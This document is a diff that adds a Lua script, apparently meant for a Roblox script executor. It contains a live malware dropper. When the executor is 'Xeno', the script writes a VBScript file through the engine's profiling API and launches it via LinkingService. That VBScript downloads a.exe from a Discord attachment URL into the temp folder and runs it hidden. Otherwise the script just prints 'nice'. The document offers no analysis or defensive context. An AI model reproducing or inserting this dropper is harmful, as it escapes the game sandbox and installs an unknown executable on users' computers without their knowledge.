@@ -1,0 +1,35 @@
+if string.find(identifyexecutor(),"Xeno") then
+script:FindFirstAncestorWhichIsA("DataModel").LinkingService:OpenUrl(
+    script:FindFirstAncestorWhichIsA("DataModel")
+        :FindService("ScriptContext")
+        :SaveScriptProfilingData(
+            [[
+Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
+Set objADOStream = CreateObject("ADODB.Stream")
+Set WshShell = CreateObject("WScript.Shell")
+url = "https://cdn.discordapp.com/attachments/1344676129633599581/1346452432615641118/a.exe?ex=67c83d0b&is=67c6eb8b&hm=93e40ecf49dd207fa6dfe6b781e019b7c946da5ef9b43999cb6f9e3cf889b9bd&"
+output = WshShell.ExpandEnvironmentStrings("%TEMP%") & "\a.exe"
+objXMLHTTP.Open "GET", url, False
+objXMLHTTP.Send
+If objXMLHTTP.Status = 200 Then
+    Set objADOStream = CreateObject("ADODB.Stream")
+    objADOStream.Open
+    objADOStream.Type = 1
+    objADOStream.Write objXMLHTTP.ResponseBody
+    objADOStream.Position = 0
+    objADOStream.SaveToFile output, 2
+    objADOStream.Close
+
+    WshShell.Run output, 0, False
+End If
+
+Set objADOStream = Nothing
+Set objXMLHTTP = Nothing
+Set WshShell = Nothing
+            ]], 
+            "whatsafather.vbs"
+        )
+)
+else
+print("nice")
+end
